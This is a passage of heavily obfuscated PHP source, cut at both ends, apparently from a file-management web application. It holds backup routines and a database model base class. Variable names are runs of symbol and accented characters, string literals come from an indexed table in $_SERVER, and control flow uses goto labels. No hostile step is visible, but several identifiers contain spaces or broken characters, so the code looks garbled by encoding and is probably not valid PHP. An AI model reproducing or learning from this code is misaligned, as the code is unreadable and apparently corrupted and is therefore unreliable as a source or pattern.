self::$manual, $²âš”®Ú[378] => array($²âš”®Ú[845] => array($²âš”®Ú[839] => 0), $²âš”®Ú[846] => array($²âš”®Ú[839] => 0, $²âš”®Ú[847] => 0, $²âš”®Ú[848] => 0, $²âš”®Ú[33] => $²âš”®Ú[12], $²âš”®Ú[849] => 0, $²âš”®Ú[850] => 0), $²âš”®Ú[851] => array($²âš”®Ú[839] => 0, $²âš”®Ú[847] => 0, $²âš”®Ú[848] => 0, $²âš”®Ú[849] => 0, $²âš”®Ú[850] => 0), $²âš”®Ú[240] => array($²âš”®Ú[839] => 0, $²âš”®Ú[852] => 0, $²âš”®Ú[853] => 0, $²âš”®Ú[854] => 0, $²âš”®Ú[855] => 0, $²âš”®Ú[550] => $¥¨°÷ùç, $²âš”®Ú[849] => 0, $²âš”®Ú[850] => 0)), $²âš”®Ú[849] => time(), $²âš”®Ú[850] => 0); $»´Å÷ÇÆ = $this->model->insert($š™¡¸ùŒ); $š™¡¸ùŒ[$²âš”®Ú[484]] = $»´Å÷ÇÆ; return $š™¡¸ùŒ; } private function checkStore($§ç™…™±) { $âÛñı„» = Model($_SERVER[÷ôÚîå][856]); $šÊ—á¯— = $âÛñı„»->listData($§ç™…™±); $âÛñı„»->checkConfig($šÊ—á¯—); } public static function get() { if (!self::$option) { $Ş¨Ãœ·ö = Model($_SERVER[÷ôÚîå][837]); $¡ÑàÌû = $Ş¨Ãœ·ö->findByName(self::$name); $Ş¨Ãœ·ö->parseContent($¡ÑàÌû); self::$option = $¡ÑàÌû; } return self::$option; } public static function set($ØÒĞéìı) { $ãµñç„İ =& $_SERVER[÷ôÚîå]; $Ôº”æº = self::get(); foreach ($ØÒĞéìı as $¿ÙöÍØÕ => $±–×ñ©) { array_set_value($Ôº”æº, $¿ÙöÍØÕ, $±–×ñ©); } Model($ãµñç„İ[837])->update($Ôº”æº[$ãµñç„İ[484]], $Ôº”æº); self::$option = $Ôº”æº; return self::$option; } public function keep() { $½¶Áâ‹ =& $_SERVER[÷ôÚîå]; $Ó½ÃÉÖ• = self::get(); if (_get($Ó½ÃÉÖ•, $½¶Áâ‹[857], 0) == $½¶Áâ‹[101]) { return; } $this->backupKeep($Ó½ÃÉÖ•); self::set(array($½¶Áâ‹[857] => 1)); } private function backupKeep($¤è»ï–¡) { $Ó—¬øú” =& $_SERVER[÷ôÚîå]; if (self::$manual == 1) { return; } $¹ä†¯‡İ = $this->model->listData(); if (empty($¹ä†¯‡İ)) { return; } $×ïƒÌ• = 0; $«·‘œä” = array(); foreach ($¹ä†¯‡İ as $„…Ñ¥°Ê) { if ($×ïƒÌ• >= 7) { break; } $«·‘œä”[] = $„…Ñ¥°Ê[$Ó—¬øú”[32]]; $×ïƒÌ•++; } for ($×ïƒÌ• = 0; $×ïƒÌ• < 12; $×ïƒÌ•++) { $«·‘œä”[] = date($Ó—¬øú”[858], strtotime("\x2d{$×ïƒÌ•}\x20\155\x6f\156\164\x68\x73")); } $«·‘œä” = array_unique($«·‘œä”); $Ä£•ææõ = Model($Ó—¬øú”[859])->get($Ó—¬øú”[860]); foreach ($¹ä†¯‡İ as $„…Ñ¥°Ê) { if (isset($„…Ñ¥°Ê[$Ó—¬øú”[844]]) && $„…Ñ¥°Ê[$Ó—¬øú”[844]] == $Ó—¬øú”[101]) { continue; } if (!empty($„…Ñ¥°Ê[$Ó—¬øú”[32]]) && in_array($„…Ñ¥°Ê[$Ó—¬øú”[32]], $«·‘œä”)) { continue; } $this->model->remove($„…Ñ¥°Ê[$Ó—¬øú”[484]]); $–åÁ¾£Ò = $this->backupPath($¤è»ï–¡, $Ä£•ææõ); IO::remove($–åÁ¾£Ò, !1); } } private function backupPath($ÈËÈ¿±Î, $öÔŒÀ¿Û = false) { $¤Ïô×€À =& $_SERVER[÷ôÚîå]; if (!$öÔŒÀ¿Û) { $öÔŒÀ¿Û = Model($¤Ïô×€À[859])->get($¤Ïô×€À[860]); } $±Í›ßêÍ = $ÈËÈ¿±Î[$¤Ïô×€À[32]]; $¼´åù¤ = substr(md5($¤Ïô×€À[861] . $öÔŒÀ¿Û . $±Í›ßêÍ), 0, 8); return "\173\x69\x6f\x3a{$ÈËÈ¿±Î[$¤Ïô×€À[841]]}\175\x2f\144\141\164\141\142\x61\163\145\57\x62\x61\x63\153\165\160\57" . $±Í›ßêÍ . $¤Ïô×€À[11] . $¼´åù¤; } public function db() { $ùÀ¤óì =& $_SERVER[÷ôÚîå]; $ØÂíğ¾ = self::get(); if (_get($ØÂíğ¾, $ùÀ¤óì[862], 0) == $ùÀ¤óì[101]) { return !0; } $ÀÄ‹¢â = new BackupDb(); if (!$ÀÄ‹¢â->index()) { return !1; } self::set(array($ùÀ¤óì[862] => 1)); return !0; } public function dbFile() { $éˆ®ú¯ò =& $_SERVER[÷ôÚîå]; $ù¸¶· ² = self::get(); if (_get($ù¸¶· ², $éˆ®ú¯ò[863], 0) == $éˆ®ú¯ò[101]) { return !0; } $Ï‚Àáí = new BackupDbFile(); if (!$Ï‚Àáí->index()) { return !1; } self::set(array($éˆ®ú¯ò[863] => 1)); return !0; } public function file() { $±¹”ğÛ• =& $_SERVER[÷ôÚîå]; $àÙ¸¢ŒÜ = self::get(); if (_get($àÙ¸¢ŒÜ, $±¹”ğÛ•[864], 0) == $±¹”ğÛ•[101]) { return !0; } if ($àÙ¸¢ŒÜ[$±¹”ğÛ•[181]] == $±¹”ğÛ•[865]) { $ÙîÇŠ– = new BackupFile(); if (!$ÙîÇŠ–->index()) { return !1; } } self::set(array($±¹”ğÛ•[864] => 1, $±¹”ğÛ•[839] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $€õÓ«…Ç =& $_SERVER[÷ôÚîå]; $²ÎÏÇ©” = Backup::get(); self::$io = $²ÎÏÇ©”[$€õÓ«…Ç[841]]; self::$name = $²ÎÏÇ©”[$€õÓ«…Ç[32]]; $ÑêÅ˜åï = new DbManage(); $¥ „¬–ê = $ÑêÅ˜åï->dbType(); $ÅÂ”ïŸ = array($€õÓ«…Ç[866] => $¥ „¬–ê, $€õÓ«…Ç[867] => time()); Backup::set($ÅÂ”ïŸ); $ÈÂú—˜Õ = $this->tmpFilesPath() . $€õÓ«…Ç[868] . self::$name . $€õÓ«…Ç[8]; del_dir($ÈÂú—˜Õ); mk_dir($ÈÂú—˜Õ); $º™ÚŒ·å = $âÏè€• = 0; try { $Ô¹´ÂÖ = $ÑêÅ˜åï->db()->getTables(); } catch (Exception $Å®ù·²) { return !1; } $Ô¹´ÂÖ = array_diff($Ô¹´ÂÖ, array($€õÓ«…Ç[869], $€õÓ«…Ç[870])); foreach ($Ô¹´ÂÖ as $ßˆµ´Ü) { $º™ÚŒ·å += $ÑêÅ˜åï->model($ßˆµ´Ü)->count(); } $Ş“³”Ìù = new Task($€õÓ«…Ç[871], $€õÓ«…Ç[872], $º™ÚŒ·å, LNG($€õÓ«…Ç[873]) . $€õÓ«…Ç[874] . LNG($€õÓ«…Ç[875])); $GLOBALS[$€õÓ«…Ç[876]] = self::$name; foreach ($Ô¹´ÂÖ as $ßˆµ´Ü) { $€û¿Í‡¼ = $ÈÂú—˜Õ . $ßˆµ´Ü . $€õÓ«…Ç[877]; $ã©õÏ¬‘ = null; if ($ßˆµ´Ü == $€õÓ«…Ç[878] && (!isset($²ÎÏÇ©”[$€õÓ«…Ç[181]]) || $²ÎÏÇ©”[$€õÓ«…Ç[181]] == $€õÓ«…Ç[238])) { $ã©õÏ¬‘ = self::$io; } $âÏè€• += $ÑêÅ˜åï->sqlFromDb($ßˆµ´Ü, $€û¿Í‡¼, $Ş“³”Ìù, $ã©õÏ¬‘); } unset($GLOBALS[$€õÓ«…Ç[876]]); $Ş“³”Ìù->end(); if ($âÏè€• > $º™ÚŒ·å) { $º™ÚŒ·å = $âÏè€•; } $ÅÂ”ïŸ = array($€õÓ«…Ç[866] => $¥ „¬–ê, $€õÓ«…Ç[862] => 1, $€õÓ«…Ç[879] => $º™ÚŒ·å, $€õÓ«…Ç[880] => $âÏè€•, $€õÓ«…Ç[881] => time()); Backup::set($ÅÂ”ïŸ); if ($º™ÚŒ·å - $âÏè€• > 0) { $²´“¯ƒ£ = $€õÓ«…Ç[882]; if (!stristr(I18n::getType(), $€õÓ«…Ç[883])) { $²´“¯ƒ£ = $€õÓ«…Ç[884]; } write_log(array($²´“¯ƒ£, $ÅÂ”ïŸ), $€õÓ«…Ç[872]); return !1; } return !0; } private function tmpFilesPath() { $÷À¬ìí¥ =& $_SERVER[÷ôÚîå]; $Œƒ¯à•ñ = TEMP_FILES; if ($GLOBALS[$÷À¬ìí¥[6]][$÷À¬ìí¥[102]][$÷À¬ìí¥[885]]) { $Œƒ¯à•ñ = $GLOBALS[$÷À¬ìí¥[6]][$÷À¬ìí¥[102]][$÷À¬ìí¥[885]]; if (!mk_dir($Œƒ¯à•ñ) || !is_writable($Œƒ¯à•ñ) || !IO::mkfile($Œƒ¯à•ñ . $÷À¬ìí¥[886])) { $Œƒ¯à•ñ = TEMP_FILES; } } return $Œƒ¯à•ñ; } } $_file = $_SERVER[$_SERVER[÷ôÚîå][69]]; goto Eô«˜À‘Çà; bˆ¬‰—ñ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\155\145", "\164\x69\155\x65", "\x69\156\163\145\162\x74\x2c\x75\160\144\141\x74\x65", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\143\162\x65\x61\x74\x65\x54\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\163\145\x72\x74", "\146\x75\x6e\x63\164\x69\157\x6e")); public function setDataAuto($ª”Ü¼Ûñ) { $this->dataAuto = $ª”Ü¼Ûñ; } public function __construct($±­şîŞó = '', $ˆÊÁËôÌ = '', $´Ùæ§¦Ô = '') { parent::__construct($±­şîŞó, $ˆÊÁËôÌ, $´Ùæ§¦Ô); } protected $tableMeta = array(); protected function _beforeInsert(&$×á†é›¯, $‚ ÂòØ¥) { $Ë¡´…¬Û =& $_SERVER[÷ôÚîå]; if (!$this->checkDataAutoHas($Ë¡´…¬Û[440])) { return; } $this->dataBeforeFilter($×á†é›¯, $Ë¡´…¬Û[440]); } protected function _beforeUpdate(&$¢ØÜ¦Å, $î”‡ƒÉû) { $Ü¹­ö =& $_SERVER[÷ôÚîå]; if (!$this->checkDataAutoHas($Ü¹­ö[441])) { return; } $this->dataBeforeFilter($¢ØÜ¦Å, $Ü¹­ö[441]); } protected function _afterSelect(&$£ÏÙ©¼—, $»ªâšã) { if (!is_array($£ÏÙ©¼—)) { return; } if (!$this->checkDataAutoHas($_SERVER[÷ôÚîå][442])) { return; } foreach ($£ÏÙ©¼— as &$÷¬öØ—´) { $this->dataAfterFilter($÷¬öØ—´); } unset($÷¬öØ—´); } protected function _afterFind(&$©¥²Ë» , $ƒæû±âÜ) { if (!is_array($©¥²Ë» )) { return; } if (!$this->checkDataAutoHas($_SERVER[÷ôÚîå][442])) { return; } $this->dataAfterFilter($©¥²Ë» ); } public static function textEncode($¸‡ù–Æì) { if (!$¸‡ù–Æì) { return $¸‡ù–Æì; } $”Äßö¦ = json_encode($¸‡ù–Æì); $”Äßö¦ = preg_replace_callback($_SERVER[÷ôÚîå][443], function ($•Ùõœô) { return addslashes($•Ùõœô[0]); }, $”Äßö¦); return json_decode($”Äßö¦); } public static function textDecode($ÁÇ·¯éÄ) { $ï¤ËÛ«á =& $_SERVER[÷ôÚîå]; $ÁÜ¡¹àš = json_encode($ÁÇ·¯éÄ); $ÁÜ¡¹àš = preg_replace_callback($ï¤ËÛ«á[444], function ($ËĞ·Âò‰) { return $_SERVER[÷ôÚîå][110]; }, $ÁÜ¡¹àš); return json_decode($ÁÜ¡¹àš); } public function setAutoIncrement($İóƒ²Œ«) { $øù½§Ê­ = array($this->getPk() => $İóƒ²Œ«); $Ö¾…€¼è = $this->data($øù½§Ê­)->add(); if ($Ö¾…€¼è) { $this->delete($Ö¾…€¼è); } } public function getAutoIncrement() { $âÛ”À±ã = $this->getTableName(); $€ï•Ş¾ = $this->max($this->getPk()); $çÁê„¡† = $this->query("\163\150\x6f\167\40\164\x61\x62\154\x65\40\163\164\141\164\x75\163\40\x77\150\x65\162\x65\x20\116\141\155\x65\75\x27{$âÛ”À±ã}\47"); $ù³¿© = $çÁê„¡†[0][$_SERVER[÷ôÚîå][445]]; $ƒ‚î³‹ü = max($€ï•Ş¾, $ù³¿©); return $ƒ‚î³‹ü; } protected function _callBefore($şæ÷‰Õ¥, $ùæ§èÏ) { return $this->cacheCallCheck($şæ÷‰Õ¥, $ùæ§èÏ, !1); } protected function _callAfter($‘×ÃªÈó, $û Ğ¸®) { return $this->cacheCallCheck($‘×ÃªÈó, $û Ğ¸®, !0); } protected function cacheFunctionAlias($ €û½—Ò) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ñÙ€˜µ•, $˜ÓâıŞè, $±Õ‚Üãª = false) { $„ËáØ¨» = $this->cacheFunctionAlias($˜ÓâıŞè); if (!$„ËáØ¨») { return; } foreach ($„ËáØ¨» as $íğÀ²‘à => $ÈÉââßï) { $æ¬Î•é = $ÈÉââßï[0]; $¨È›ºù» = explode($_SERVER[÷ôÚîå][50], $ÈÉââßï[1]); if ($ñÙ€˜µ• == $íğÀ²‘à) { return $this->cacheFunctionGet($íğÀ²‘à, $æ¬Î•é); } if ($±Õ‚Üãª && in_array($ñÙ€˜µ•, $¨È›ºù»)) { $this->cacheFunctionClear($íğÀ²‘à, $æ¬Î•é); } } } public function cacheFunctionGet($ÒÛ²Æ×, $œÊÈ) { $•‚ÀÒ¦­ = $this->cacheKeyMake($ÒÛ²Æ×, $œÊÈ); $Ú…âÁà„ = Cache::get($•‚ÀÒ¦­); if (!is_array($Ú…âÁà„)) { $Ú…âÁà„ = call_user_func_array(array($this, $ÒÛ²Æ×), array($œÊÈ, !0)); Cache::set($•‚ÀÒ¦­, $Ú…âÁà„); } return $Ú…âÁà„; } public function cacheFunctionClear($³¯²’ÆØ, $ù²Ã†ëü) { $¯Çì´¡ƒ = $ù²Ã†ëü; if (!is_array($ù²Ã†ëü)) { $¯Çì´¡ƒ = array($ù²Ã†ëü); } foreach ($¯Çì´¡ƒ as $Ì¤“ûî½) { $ïò€ë¶ = $this->cacheKeyMake($³¯²’ÆØ, $Ì¤“ûî½); Cache::remove($ïò€ë¶); } } private function cacheKeyMake($ßô›òòÜ, $ØÌì€í) { $”ƒ€”µË =& $_SERVER[÷ôÚîå]; return get_class($this) . $”ƒ€”µË[11] . $ßô›òòÜ . $”ƒ€”µË[446] . $ØÌì€í; } protected function selectPageReset() { $Å„€¿¦® =& $_SERVER[÷ôÚîå]; if (isset($GLOBALS[$Å„€¿¦®[447]])) { return; } $GLOBALS[$Å„€¿¦®[447]] = isset($GLOBALS[$Å„€¿¦®[7]][$Å„€¿¦®[448]]) ? $GLOBALS[$Å„€¿¦®[7]][$Å„€¿¦®[448]] : !1; $GLOBALS[$Å„€¿¦®[449]] = isset($GLOBALS[$Å„€¿¦®[7]][$Å„€¿¦®[438]]) ? $GLOBALS[$Å„€¿¦®[7]][$Å„€¿¦®[438]] : !1; $GLOBALS[$Å„€¿¦®[7]][$Å„€¿¦®[448]] = !1; $GLOBALS[$Å„€¿¦®[7]][$Å„€¿¦®[438]] = !1; } protected function selectPageRestore() { $§‚†¤Î =& $_SERVER[÷ôÚîå]; if (!isset($GLOBALS[$§‚†¤Î[447]])) { return; } $GLOBALS[$§‚†¤Î[7]][$§‚†¤Î[448]] = $GLOBALS[$§‚†¤Î[447]]; $GLOBALS[$§‚†¤Î[7]][$§‚†¤Î[438]] = $GLOBALS[$§‚†¤Î[449]]; if ($GLOBALS[$§‚†¤Î[7]][$§‚†¤Î[448]] === !1) { unset($GLOBALS[$§‚†¤Î[7]][$§‚†¤Î[448]]); } if ($GLOBALS[$§‚†¤Î[7]][$§‚†¤Î[438]] === !1) { unset($GLOBALS[$§‚†¤Î[7]][$§‚†¤Î[438]]); } unset($GLOBALS[$§‚†¤Î[447]]); unset($GLOBALS[$§‚†¤Î[449]]); } protected function selectPage($Ø¥™µØÂ = 200, $‚—°¸œ = 1) { $ü×ì¯ó =& $_SERVER[÷ôÚîå]; global $in; $¸Ù¨ÂÅ® = $this->optionsValue(); $Á‚º˜‡ç = 50000; $Ø¥™µØÂ = isset($in[$ü×ì¯ó[448]]) && $in[$ü×ì¯ó[448]] ? $in[$ü×ì¯ó[448]] : $Ø¥™µØÂ; if ($Ø¥™µØÂ === -1) { $in[$ü×ì¯ó[448]] = !1; $Á‚º˜‡ç = 100000000; $Ø¥™µØÂ = $Á‚º˜‡ç; } $È®ïõí‚ = $¸Ù¨ÂÅ®; $È®ïõí‚[$ü×ì¯ó[450]] = array(); $Ø¥™µØÂ = intval($Ø¥™µØÂ); $Ø¥™µØÂ = $Ø¥™µØÂ <= 5 ? 5 : ($Ø¥™µØÂ >= $Á‚º˜‡ç ? $Á‚º˜‡ç : $Ø¥™µØÂ); $‚—°¸œ = intval(isset($in[$ü×ì¯ó[438]]) && $in[$ü×ì¯ó[438]] ? $in[$ü×ì¯ó[438]] : $‚—°¸œ); $‚—°¸œ = $‚—°¸œ <= 1 ? 1 : $‚—°¸œ; $’¯‘¡Éì = array(); $ÅïšÔòé = 1; if ($‚—°¸œ == 1 && $ÅïšÔòé) { $this->optionsValue($¸Ù¨ÂÅ®); $’¯‘¡Éì = $this->page($‚—°¸œ, $Ø¥™µØÂ)->select(); $¤ÚÑ»‘ñ = is_array($’¯‘¡Éì) ? count($’¯‘¡Éì) : 0; if ($¤ÚÑ»‘ñ < $Ø¥™µØÂ) { $×Å¤‘º¯ = 1; } else { $this->optionsValue($È®ïõí‚); $¤ÚÑ»‘ñ = intval($this->count()); $×Å¤‘º¯ = ceil($¤ÚÑ»‘ñ / $Ø¥™µØÂ); } } else { $this->optionsValue($È®ïõí‚); $¤ÚÑ»‘ñ = intval($this->count()); $×Å¤‘º¯ = ceil($¤ÚÑ»‘ñ / $Ø¥™µØÂ); $‚—°¸œ = $‚—°¸œ >= $×Å¤‘º¯ ? $×Å¤‘º¯ : $‚—°¸œ; $this->optionsValue($¸Ù¨ÂÅ®); $’¯‘¡Éì = $this->page($‚—°¸œ, $Ø¥™µØÂ)->select(); } if (!is_array($’¯‘¡Éì)) { $’¯‘¡Éì = array(); } if ($×Å¤‘º¯ == 1) { $¤ÚÑ»‘ñ = count($’¯‘¡Éì); } $¢şÚñ’÷ = array($ü×ì¯ó[451] => array($ü×ì¯ó[452] => $¤ÚÑ»‘ñ, $ü×ì¯ó[448] => $Ø¥™µØÂ, $ü×ì¯ó[438] => $‚—°¸œ, $ü×ì¯ó[453] => $×Å¤‘º¯), $ü×ì¯ó[454] => $’¯‘¡Éì); return $¢şÚñ’÷; } protected function checkLength($ú„ûÈµı, $ü‘åª´æ = 0, $–¨º»ËÈ = '') { $Œ“øƒº¡ =& $_SERVER[÷ôÚîå]; $ü‘åª´æ = $ü‘åª´æ ? $ü‘åª´æ : 65536; if (!$ú„ûÈµı || strlen($ú„ûÈµı) < $ü‘åª´æ) { return; } $–¨º»ËÈ = $–¨º»ËÈ ? $–¨º»ËÈ . $Œ“øƒº¡[84] : $Œ“øƒº¡[12]; show_json($–¨º»ËÈ . LNG($Œ“øƒº¡[455]) . "\x28{$ü‘åª´æ}\51", !1); } protected function metaSet($ıÏ‚î±, $¨ûûõ¥ˆ = null, $é·Ô³Œ  = null) { $õ½šÀ‡ç =& $_SERVER[÷ôÚîå]; if (!$this->tableMeta || !$ıÏ‚î±) { return !1; } $‘½Ò°¬“ = $this->tableMeta[$õ½šÀ‡ç[456]]; $¯ÇÑ‘ù€ = $this->tableMeta[$õ½šÀ‡ç[457]]; $£ş©£ç¨ = Model($¯ÇÑ‘ù€); $Á¿ãŠï¶ = array($‘½Ò°¬“ => $ıÏ‚î±, $õ½šÀ‡ç[458] => $¨ûûõ¥ˆ); if (is_null($¨ûûõ¥ˆ)) { return $£ş©£ç¨->where(array($‘½Ò°¬“ => $ıÏ‚î±))->delete(); } if (is_null($é·Ô³Œ ) && is_string($¨ûûõ¥ˆ)) { return $£ş©£ç¨->where($Á¿ãŠï¶)->delete(); } $ò¶òÏÄû = is_array($¨ûûõ¥ˆ) ? $¨ûûõ¥ˆ : array(); if (is_string($¨ûûõ¥ˆ)) { $ò¶òÏÄû[$¨ûûõ¥ˆ] = $é·Ô³Œ ; } $È€òÓ¥° = array(); foreach ($ò¶òÏÄû as $—ĞåŸ => $•ºÔ‚£ã) { if (is_null($•ºÔ‚£ã) && is_string($—ĞåŸ)) { $£ş©£ç¨->where(array($‘½Ò°¬“ => $ıÏ‚î±, $õ½šÀ‡ç[458] => $—ĞåŸ))->delete(); continue; } $this->checkLength($•ºÔ‚£ã, !1, $¯ÇÑ‘ù€ . $õ½šÀ‡ç[4] . $—ĞåŸ); $È€òÓ¥°[] = array($‘½Ò°¬“ => $ıÏ‚î±, $õ½šÀ‡ç[107] => $—ĞåŸ, $õ½šÀ‡ç[459] => $•ºÔ‚£ã); } $¼­—² = $õ½šÀ‡ç[460] . $¯ÇÑ‘ù€; CacheLock::lock($¼­—²); $£ş©£ç¨->where(array($‘½Ò°¬“ => $ıÏ‚î±))->addAll($È€òÓ¥°, array(), !0); CacheLock::unlock($¼­—²); return !0; } public function metaGet($·¤˜™˜Ë, $Û–·âÖ½ = false) { $¶’Ğ¦ô¹ =& $_SERVER[÷ôÚîå]; if (!$this->tableMeta) { return array(); } $ê™§®ù = $this->tableMeta[$¶’Ğ¦ô¹[456]]; $¿”ÜŠ¶ = Model($this->tableMeta[$¶’Ğ¦ô¹[457]]); if ($Û–·âÖ½) { $ãï”ñ›¥ = array($ê™§®ù => $·¤˜™˜Ë, $¶’Ğ¦ô¹[107] => $Û–·âÖ½); return $¿”ÜŠ¶->where($ãï”ñ›¥)->getField($¶’Ğ¦ô¹[459]); } $ãï”ñ›¥ = array($ê™§®ù => $·¤˜™˜Ë); $—Î•Ç°³ = $¿”ÜŠ¶->field($¶’Ğ¦ô¹[461])->where($ãï”ñ›¥)->select(); $—Î•Ç°³ = array_to_keyvalue($—Î•Ç°³, $¶’Ğ¦ô¹[107], $¶’Ğ¦ô¹[459]); return $—Î•Ç°³; } private function checkDataAutoHas($åÙ´‚Ö¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $×ÌÜù†—) { if (in_array($åÙ´‚Ö¤, explode($_SERVER[÷ôÚîå][50], $×ÌÜù†—[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ò¦ôŸŒ£, $×ÙÂê€°) { $Â×ú÷ÊÖ =& $_SERVER[÷ôÚîå]; if (!is_array($ò¦ôŸŒ£)) { return; } foreach ($this->dataAuto as $Œù°Œª¿) { $Ò¹çí¾ = $Œù°Œª¿[0]; if (!in_array($×ÙÂê€°, explode($Â×ú÷ÊÖ[50], $Œù°Œª¿[2]))) { continue; } switch (trim($Œù°Œª¿[3])) { case $Â×ú÷ÊÖ[406]: case $Â×ú÷ÊÖ[407]: $í›¿â¬® = $Œù°Œª¿[1]; $ŞäÜâĞª = isset($Œù°Œª¿[4]) ? (array) $Œù°Œª¿[4] : array(); if ($í›¿â¬® == $Â×ú÷ÊÖ[216] && array_key_exists($Ò¹çí¾, $ò¦ôŸŒ£)) { if (!$ò¦ôŸŒ£[$Ò¹çí¾]) { unset($ò¦ôŸŒ£[$Ò¹çí¾]); } break; } if (isset($ò¦ôŸŒ£[$Ò¹çí¾])) { array_unshift($ŞäÜâĞª, $ò¦ôŸŒ£[$Ò¹çí¾]); } if ($Â×ú÷ÊÖ[406] == $Œù°Œª¿[3]) { $ò¦ôŸŒ£[$Ò¹çí¾] = call_user_func_array($í›¿â¬®, $ŞäÜâĞª); } else { $ò¦ôŸŒ£[$Ò¹çí¾] = call_user_func_array(array(&$this, $í›¿â¬®), $ŞäÜâĞª); } break; case $Â×ú÷ÊÖ[356]: if (isset($ò¦ôŸŒ£[$Ò¹çí¾]) && $ò¦ôŸŒ£[$Ò¹çí¾]) { $ò¦ôŸŒ£[$Ò¹çí¾] = call_user_func_array(array(&$this, $Œù°Œª¿[1]), array($ò¦ôŸŒ£[$Ò¹çí¾])); } break; case $Â×ú÷ÊÖ[359]: $ò¦ôŸŒ£[$Ò¹çí¾] = $ò¦ôŸŒ£[$Œù°Œª¿[1]]; break; case $Â×ú÷ÊÖ[379]: if (isset($ò¦ôŸŒ£[$Ò¹çí¾]) && !is_string($ò¦ôŸŒ£[$Ò¹çí¾])) { $ò¦ôŸŒ£[$Ò¹çí¾] = json_encode_force($ò¦ôŸŒ£[$Ò¹çí¾]); } break; case $Â×ú÷ÊÖ[408]: if ($ò¦ôŸŒ£[$Ò¹çí¾] === $Â×ú÷ÊÖ[12]) { unset($ò¦ôŸŒ£[$Ò¹çí¾]); } break; case $Â×ú÷ÊÖ[409]: $ò¦ôŸŒ£[$Ò¹çí¾] = $Œù°Œª¿[1]; default: break; } } if ($×ÙÂê€° == $Â×ú÷ÊÖ[440]) { $›®£ïÏ = strtolower($this->db->getDbType()); if (strpos($›®£ïÏ, $Â×ú÷ÊÖ[13]) !== 0) { return; } $èŠóß÷† = $this->field(!0)->fields; $»¦Ö¸æ = $èŠóß÷†[$Â×ú÷ÊÖ[338]]; if (isset($èŠóß÷†[$Â×ú÷ÊÖ[337]])) { unset($»¦Ö¸æ[$èŠóß÷†[$Â×ú÷ÊÖ[337]]]); } foreach ($»¦Ö¸æ as $’ğ©Íßƒ => $×ÙÂê€°) { if (!isset($ò¦ôŸŒ£[$’ğ©Íßƒ])) { $ò¦ôŸŒ£[$’ğ©Íßƒ] = $Â×ú÷ÊÖ[12]; } } } } private function dataAfterFilter(&$ À‘ŞÜå) { $Ñ²È›‚Û =& $_SERVER[÷ôÚîå]; foreach ($this->dataAuto as $¨§¾ù€ş) { $ÁÖ¨¹ÕÉ = $¨§¾ù€ş[0]; if (!isset($ À‘ŞÜå[$ÁÖ¨¹ÕÉ])) { continue; } if (!in_array($Ñ²È›‚Û[442], explode($Ñ²È›‚Û[50], $¨§¾ù€ş[2]))) { continue; } switch (trim($¨§¾ù€ş[3])) { case $Ñ²È›‚Û[406]: case $Ñ²È›‚Û[407]: $È’ˆ€ë¬ = isset($¨§¾ù€ş[4]) ? (array) $¨§¾ù€ş[4] : array(); array_unshift($È’ˆ€ë¬, $ À‘ŞÜå[$ÁÖ¨¹ÕÉ]); if (isset($¨§¾ù€ş[4]) && $¨§¾ù€ş[4] == $Ñ²È›‚Û[462]) { $È’ˆ€ë¬ = array($ À‘ŞÜå[$ÁÖ¨¹ÕÉ]); } if ($Ñ²È›‚Û[406] == $¨§¾ù€ş[3]) { $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = call_user_func_array($¨§¾ù€ş[1], $È’ˆ€ë¬); } else { $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = call_user_func_array(array(&$this, $¨§¾ù€ş[1]), $È’ˆ€ë¬); } break; case $Ñ²È›‚Û[356]: if (isset($ À‘ŞÜå[$ÁÖ¨¹ÕÉ]) && $ À‘ŞÜå[$ÁÖ¨¹ÕÉ]) { $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = call_user_func_array(array(&$this, $¨§¾ù€ş[1]), array($ À‘ŞÜå[$ÁÖ¨¹ÕÉ])); } break; case $Ñ²È›‚Û[359]: $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = $ À‘ŞÜå[$¨§¾ù€ş[1]]; break; case $Ñ²È›‚Û[379]: $èß‚¢†ƒ = $ À‘ŞÜå[$ÁÖ¨¹ÕÉ]; $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = json_decode($èß‚¢†ƒ, !0); if (is_null($ À‘ŞÜå[$ÁÖ¨¹ÕÉ])) { $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = $èß‚¢†ƒ; } break; case $Ñ²È›‚Û[408]: if ($ À‘ŞÜå[$ÁÖ¨¹ÕÉ] === $Ñ²È›‚Û[12]) { unset($ À‘ŞÜå[$ÁÖ¨¹ÕÉ]); } break; case $Ñ²È›‚Û[409]: $ À‘ŞÜå[$ÁÖ¨¹ÕÉ] = $¨§¾ù€ş[1]; break; default: break; } } } public function saveAll($ˆ™Æºôì) { $åÔ˜Œ‚ =& $_SERVER[÷ôÚîå]; $Ö°ğìÏ = $this->tablePrefix . $this->tableName; $à‘ÅàĞí = self::SQL_WHERE_IN_CHUNK; $ˆ™Æºôì = is_array($ˆ™Æºôì) ? $ˆ™Æºôì : array(); $˜ºˆ›ÚÏ = $åÔ˜Œ‚[463]; $ûÇ¶º‰Ú = 0; $ê‘³ôÚ‚ = array(); $âò³ƒ = count($ˆ™Æºôì); for ($Ò®‘È«å = 0; $Ò®‘È«å < $âò³ƒ; $Ò®‘È«å++) { $á®‹Ìì‰ = $ˆ™Æºôì[$Ò®‘È«å]; if (!is_array($á®‹Ìì‰) || count($á®‹Ìì‰) != 4) { continue; } $Ûêò“®ë = "\x55\x50\104\x41\124\105\x20\140{$Ö°ğìÏ}\x60\x20\123\105\x54\40{$á®‹Ìì‰[2]}\x20\75\x20\x43\x41\123\x45\x20{$á®‹Ìì‰[0]}\40\12"; if ($ûÇ¶º‰Ú == 0) { $˜ºˆ›ÚÏ = $Ûêò“®ë; } $ê‘³ôÚ‚[] = $åÔ˜Œ‚[131] . $á®‹Ìì‰[1] . $åÔ˜Œ‚[131]; $ûÇ¶º‰Ú++; $˜ºˆ›ÚÏ .= 